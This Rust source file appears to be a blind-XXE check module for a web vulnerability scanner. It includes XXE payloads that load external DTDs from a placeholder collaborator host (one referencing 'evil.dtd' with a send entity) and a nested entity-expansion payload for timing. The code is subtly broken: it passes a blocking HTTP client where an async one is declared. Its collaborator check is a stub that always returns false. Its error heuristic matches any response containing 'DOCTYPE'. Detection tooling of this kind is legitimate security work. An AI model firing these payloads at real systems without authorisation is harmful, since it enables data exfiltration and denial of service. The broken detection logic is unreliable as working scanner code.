//! XXE Blind Injection Detection Module
//! Detects blind XXE using out-of-band DTDs and external parameter entities.

use crate::checks::CheckModule;
use crate::findings::Finding;
use std::collections::HashSet;
use std::time::Instant;

const BLIND_XXE_PAYLOADS: &[&str] = &[
    // External DTD reference
    r#"<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://{{COLLABORATOR}}/dtd.xml"><root>&xxe;</root>"#,
    // Parameter entity with external DTD
    r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://{{COLLABORATOR}}/evil.dtd"> %dtd; %send;]><root/>"#,
    // Error-based blind with timing
    r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{{COLLABORATOR}}/"> %xxe;]><root/>"#,
    // CSV-style XXE (for CSV parsers that process XML)
    r#"<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{{COLLABORATOR}}/"> %xxe;]>"#,
];

const TIME_DELAY_PAYLOADS: &[&str] = &[
    // Entity expansion causing delay
    r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY a "A"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;"><!ENTITY d "&c;&c;"><!ENTITY e "&d;&d;"><!ENTITY f "&e;&e;"><!ENTITY g "&f;&f;"><!ENTITY h "&g;&g;"><!ENTITY i "&h;&h;"><!ENTITY j "&i;&i;">]><root>&j;</root>"#,
];

pub struct XXEBlindCheck {
    enabled: bool,
    timeout_ms: u64,
    collaborator_url: Option<String>,
}

impl XXEBlindCheck {
    pub fn new() -> Self {
        Self {
            enabled: true,
            timeout_ms: 15000,
            collaborator_url: None, // Would be set from scan config in real impl
        }
    }

    fn prepare_payload(&self, payload: &str) -> String {
        if let Some(collab) = &self.collaborator_url {
            payload.replace("{{COLLABORATOR}}", collab)
        } else {
            // Without a real collaborator, we can still test time-based blind XXE
            payload.to_string()
        }
    }

    fn probe_blind(&self, url: &str, client: &reqwest::Client, payload: &str) -> Option<BlindResult> {
        let prepared = self.prepare_payload(payload);
        
        let start = Instant::now();
        let resp = client
            .post(url)
            .header("Content-Type", "application/xml")
            .body(prepared)
            .send()
            .ok()?;
        let elapsed = start.elapsed();

        let status = resp.status().as_u16();
        let body = resp.text().ok()?;

        // Time-based detection - if response took significantly longer
        let is_delayed = elapsed.as_millis() > 5000;
        
        // Check for error patterns indicating XXE processing
        let has_xxe_error = body.contains("external entity") || 
                           body.contains("cannot resolve") ||
                           body.contains("SYSTEM") ||
                           body.contains("DOCTYPE");

        if is_delayed || has_xxe_error {
            Some(BlindResult {
                url: url.to_string(),
                detection_type: if is_delayed { "time_based" } else { "error_based" }.to_string(),
                elapsed_ms: elapsed.as_millis() as u64,
                status_code: status,
                evidence: body.chars().take(300).collect::<String>(),
            })
        } else {
            None
        }
    }

    fn check_collaborator_interaction(&self, _url: &str) -> bool {
        // In a real implementation, this would poll the collaborator server
        // for DNS or HTTP interactions triggered by the XXE payload
        false
    }
}

#[derive(Debug)]
struct BlindResult {
    url: String,
    detection_type: String,
    elapsed_ms: u64,
    status_code: u16,
    evidence: String,
}

impl CheckModule for XXEBlindCheck {
    fn name(&self) -> &'static str {
        "xxe_blind"
    }

    fn description(&self) -> &'static str {
        "Detects blind XXE using out-of-band DTDs and external parameter entities"
    }

    fn severity(&self) -> crate::checks::Severity {
        crate::checks::Severity::High
    }

    fn run(&self, target: &crate::target::Target, context: &crate::context::ScanContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        
        if !self.enabled {
            return findings;
        }

        let xml_endpoints = context.xml_endpoints();
        let client = reqwest::blocking::Client::builder()
            .timeout(std::time::Duration::from_millis(self.timeout_ms))
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .unwrap_or_default();

        let mut detected_endpoints: HashSet<String> = HashSet::new();

        for endpoint in xml_endpoints {
            if detected_endpoints.contains(&endpoint) {
                continue;
            }

            // Test time-delay payloads first (work without collaborator)
            for payload in TIME_DELAY_PAYLOADS {
                if let Some(result) = self.probe_blind(&endpoint, &client, payload) {
                    detected_endpoints.insert(endpoint.clone());
                    
                    let evidence = crate::findings::Evidence::new()
                        .with_detail("endpoint", result.url.clone())
                        .with_detail("detection_type", result.detection_type.clone())
                        .with_detail("elapsed_ms", result.elapsed_ms.to_string())
                        .with_raw_response(result.evidence.clone());

                    findings.push(Finding::new(self.name())
                        .with_target(result.url)
                        .with_severity(self.severity())
                        .with_title("Blind XXE Detected (Time-Based)")
                        .with_description(format!("Time-based blind XXE detected with {}ms response time", result.elapsed_ms))
                        .with_evidence(evidence)
                        .with_confidence(0.75));
                    
                    break;
                }
            }

            // Test collaborator-based payloads if configured
            if self.collaborator_url.is_some() {
                for payload in BLIND_XXE_PAYLOADS {
                    if let Some(result) = self.probe_blind(&endpoint, &client, payload) {
                        if self.check_collaborator_interaction(&endpoint) {
                            detected_endpoints.insert(endpoint.clone());
                            
                            let evidence = crate::findings::Evidence::new()
                                .with_detail("endpoint", result.url.clone())
                                .with_detail("detection_type", "oob".to_string())
                                .with_raw_response(result.evidence.clone());

                            findings.push(Finding::new(self.name())
                                .with_target(result.url)
                                .with_severity(crate::checks::Severity::Critical)
                                .with_title("Blind XXE Detected (OOB)")
                                .with_description("Out-of-band XXE confirmed via collaborator interaction")
                                .with_evidence(evidence)
                                .with_confidence(0.95));
                            
                            break;
                        }
                    }
                }
            }
        }

        findings
    }

    fn clone_box(&self) -> Box<dyn CheckModule> {
        Box::new(self.clone())
    }
}

impl Clone for XXEBlindCheck {
    fn clone(&self) -> Self {
        Self {
            enabled: self.enabled,
            timeout_ms: self.timeout_ms,
            collaborator_url: self.collaborator_url.clone(),
        }
    }
}
